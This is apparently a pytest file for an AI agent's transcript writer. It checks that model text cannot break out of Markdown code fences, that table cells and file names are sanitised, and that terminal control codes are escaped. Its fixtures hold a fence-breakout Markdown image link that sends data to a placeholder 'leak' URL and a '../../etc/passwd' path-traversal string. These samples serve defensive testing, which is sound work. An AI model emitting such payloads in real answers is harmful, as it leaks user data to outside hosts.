"""Transcripts: the JSON record, a Markdown view that never renders model text, safe output."""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

import pytest

from agentic_bi.agent import ReplayModel, ask
from agentic_bi.agent.cli import printable
from agentic_bi.agent.transcript import render_markdown, slug, write_transcript

# An answer that tries to break out of a code block and make a Markdown viewer fetch a URL.
SNEAKY = "Done.\n````\n![x](https://example.invalid/leak?d=x) and [link](https://example.invalid)"
FY = {"start": "2024-10-01", "end": "2025-09-30"}


def _turns(answer: str) -> list[dict[str, Any]]:
    query = {"metric": "obligations", "time_range": FY}
    reply = json.dumps({"status": "answered", "answer": answer})
    return [
        {
            "stop_reason": "tool_use",
            "content": [
                {"type": "thinking", "thinking": "Plan ```` ![t](https://example.invalid)"},
                {"type": "tool_use", "id": "toolu_t1", "name": "run_query", "input": query},
            ],
        },
        {"stop_reason": "end_turn", "content": [{"type": "text", "text": reply}]},
    ]


def _outside_fences(markdown: str) -> list[str]:
    """The lines a Markdown viewer would render, outside every fenced block."""
    outside, fence = [], None
    for line in markdown.splitlines():
        match = re.match(r"^(`{3,})", line)
        if fence is None and match:
            fence = match.group(1)
        elif fence is not None and line == fence:
            fence = None
        elif fence is None:
            outside.append(line)
    return outside


@pytest.fixture
def transcript(synthetic_toolbox) -> dict[str, Any]:
    answer = f"Net obligations were $3,600.00. {SNEAKY}"
    result = ask("Net obligations?", model=ReplayModel(_turns(answer)), toolbox=synthetic_toolbox)
    assert result.answer.status == "answered"
    return result.transcript


def test_model_text_is_never_rendered_as_markdown(transcript) -> None:
    markdown = render_markdown(transcript)
    assert SNEAKY in markdown
    for line in _outside_fences(markdown):
        assert "example.invalid" not in line, line


def test_the_markdown_view_has_the_answer_queries_and_conversation(transcript) -> None:
    markdown = render_markdown(transcript)
    assert markdown.startswith("# Net obligations?\n")
    for heading in ("## Answer", "## Queries run", "### Query 1", "## Conversation"):
        assert heading in markdown
    assert '"metric": "obligations"' in markdown and "BETWEEN ? AND ?" in markdown
    assert "replay: hand-written turns" in markdown
    assert "| obligations |" in markdown and "| 3600.00 |" in markdown


def test_write_transcript_writes_json_and_markdown_and_never_overwrites(
    transcript, tmp_path: Path
) -> None:
    paths = write_transcript(tmp_path / "out", "01-net", transcript)
    assert [path.name for path in paths] == ["01-net.json", "01-net.md"]
    assert json.loads(paths[0].read_text("utf-8"))["answer"] == transcript["answer"]
    before = paths[1].read_text("utf-8")
    with pytest.raises(FileExistsError):
        write_transcript(tmp_path / "out", "01-net", transcript)
    assert paths[1].read_text("utf-8") == before


def test_table_cells_cannot_inject_markdown(synthetic_toolbox) -> None:
    from agentic_bi.agent.transcript import _table

    lines = _table(["code"], [["![i](https://example.invalid)|x"], [None]])
    assert lines[-2] == "| \\!\\[i\\](https://example.invalid)\\|x |"
    assert lines[-1] == "| null |"


@pytest.mark.parametrize(
    ("question", "expected"),
    [
        ("What were EPA's net obligations in FY2025?", "what-were-epa-s-net-obligations-in-fy2025"),
        ("../../etc/passwd", "etc-passwd"),
        ("???", "question"),
        ("x" * 80, "x" * 48),
    ],
)
def test_slug_is_a_safe_file_stem(question: str, expected: str) -> None:
    assert slug(question) == expected


def test_printable_escapes_terminal_control_characters() -> None:
    text = "ok\n\ttab \x1b[31mred\x1b[0m \x07 \x9b"
    assert printable(text) == "ok\n\ttab \\x1b[31mred\\x1b[0m \\x07 \\x9b"
